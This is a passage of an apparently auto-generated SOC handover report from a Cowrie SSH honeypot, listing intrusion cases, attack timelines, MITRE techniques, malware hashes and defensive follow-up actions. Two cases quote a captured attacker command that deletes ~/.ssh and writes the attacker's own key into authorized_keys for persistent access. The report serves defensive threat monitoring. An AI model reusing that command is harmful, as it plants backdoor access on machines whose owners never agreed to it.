| `2026-06-01 23:15:01` | `cowrie.command.failed` |
| `2026-06-01 23:15:01` | `cowrie.log.closed` |
| `2026-06-01 23:15:02` | `cowrie.session.params` |
| `2026-06-01 23:15:02` | `cowrie.command.input` |
| `2026-06-01 23:15:02` | `cowrie.session.file_download` |
| `2026-06-01 23:15:02` | `cowrie.log.closed` |
| `2026-06-01 23:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c61c1c1bf5d

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:15 |
| **Last Seen** | 2026-06-01 23:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:15:03` | `cowrie.session.connect` |
| `2026-06-01 23:15:03` | `cowrie.client.version` |
| `2026-06-01 23:15:03` | `cowrie.client.kex` |
| `2026-06-01 23:15:03` | `cowrie.login.success` |
| `2026-06-01 23:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dbbf632a6b7

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:16 |
| **Last Seen** | 2026-06-01 23:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:16:46` | `cowrie.session.connect` |
| `2026-06-01 23:16:46` | `cowrie.client.version` |
| `2026-06-01 23:16:46` | `cowrie.client.kex` |
| `2026-06-01 23:16:46` | `cowrie.login.success` |
| `2026-06-01 23:16:46` | `cowrie.session.params` |
| `2026-06-01 23:16:46` | `cowrie.command.input` |
| `2026-06-01 23:16:46` | `cowrie.command.failed` |
| `2026-06-01 23:16:46` | `cowrie.log.closed` |
| `2026-06-01 23:16:47` | `cowrie.session.params` |
| `2026-06-01 23:16:47` | `cowrie.command.input` |
| `2026-06-01 23:16:47` | `cowrie.session.file_download` |
| `2026-06-01 23:16:47` | `cowrie.log.closed` |
| `2026-06-01 23:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1136bc56b12

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:16 |
| **Last Seen** | 2026-06-01 23:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:16:48` | `cowrie.session.connect` |
| `2026-06-01 23:16:48` | `cowrie.client.version` |
| `2026-06-01 23:16:48` | `cowrie.client.kex` |
| `2026-06-01 23:16:48` | `cowrie.login.success` |
| `2026-06-01 23:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f25bb176aa8

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:22 |
| **Last Seen** | 2026-06-01 23:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:22:10` | `cowrie.session.connect` |
| `2026-06-01 23:22:10` | `cowrie.client.version` |
| `2026-06-01 23:22:10` | `cowrie.client.kex` |
| `2026-06-01 23:22:10` | `cowrie.login.success` |
| `2026-06-01 23:22:10` | `cowrie.session.params` |
| `2026-06-01 23:22:10` | `cowrie.command.input` |
| `2026-06-01 23:22:10` | `cowrie.command.failed` |
| `2026-06-01 23:22:10` | `cowrie.log.closed` |
| `2026-06-01 23:22:10` | `cowrie.session.params` |
| `2026-06-01 23:22:10` | `cowrie.command.input` |
| `2026-06-01 23:22:10` | `cowrie.session.file_download` |
| `2026-06-01 23:22:10` | `cowrie.log.closed` |
| `2026-06-01 23:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02fddfd262a4

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:22 |
| **Last Seen** | 2026-06-01 23:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:22:11` | `cowrie.session.connect` |
| `2026-06-01 23:22:11` | `cowrie.client.version` |
| `2026-06-01 23:22:11` | `cowrie.client.kex` |
| `2026-06-01 23:22:11` | `cowrie.login.success` |
| `2026-06-01 23:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.235.225[.]32` to AbuseIPDB if not already reported
- [ ] Block `20.235.225[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.123.217[.]22` | **30** | 2026-06-01 21:56 | 2026-06-01 22:48 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `137.184.204[.]8` | **14** | 2026-06-01 21:55 | 2026-06-01 23:37 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `20.235.225[.]32` | **9** | 2026-06-01 23:09 | 2026-06-01 23:23 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `159.203.20[.]239` | **5** | 2026-06-01 21:46 | 2026-06-01 22:54 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | **3** | 2026-06-01 23:23 | 2026-06-01 23:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.239[.]166` | 1 | 2026-06-01 22:00 | 2026-06-01 22:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.193.190[.]197` | 1 | 2026-06-01 22:51 | 2026-06-01 22:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.191.4[.]29` | 1 | 2026-06-01 23:11 | 2026-06-01 23:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-06-01 23:00 | 2026-06-01 23:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.20.254[.]47` | 1 | 2026-06-01 23:08 | 2026-06-01 23:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-06-01 21:58 | 2026-06-01 22:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.0.81[.]127` | 1 | 2026-06-01 22:06 | 2026-06-01 22:06 | 15s | 0 | `T1592` | 🟢 LOW |
| `198.199.94[.]79` | 1 | 2026-06-01 22:32 | 2026-06-01 22:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `23.17.35[.]68` | 1 | 2026-06-01 22:11 | 2026-06-01 22:11 | 31s | 0 | `T1592` | 🟢 LOW |
| `49.64.242[.]249` | 1 | 2026-06-01 23:00 | 2026-06-01 23:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.49.26[.]202` | 1 | 2026-06-01 21:55 | 2026-06-01 21:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `68.183.202[.]252` | 1 | 2026-06-01 22:36 | 2026-06-01 22:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.192.46[.]36` | 1 | 2026-06-01 21:53 | 2026-06-01 21:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `68.183.202[.]252` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `23.17.35[.]68` | CA | TELUS-FIBRE-CODLAB01 | **100** ⚠️ | 15 |
| `137.184.204[.]8` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `190.0.81[.]127` | DO | ASTER | **100** ⚠️ | 0 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `20.235.225[.]32` | IN | Microsoft Corporation | **100** ⚠️ | 5 |
| `192.42.116[.]46` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `115.191.4[.]29` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 10 |
| `66.132.195[.]89` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `58.49.26[.]202` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 83 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 35 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 112 cases |
| Tool 34  | Credential Extractor        | ✅ 77 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 35 priority case(s) shown individually · 18 recon entry/entries in table (5 group(s) consolidating 61 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-01T23:41:45Z_
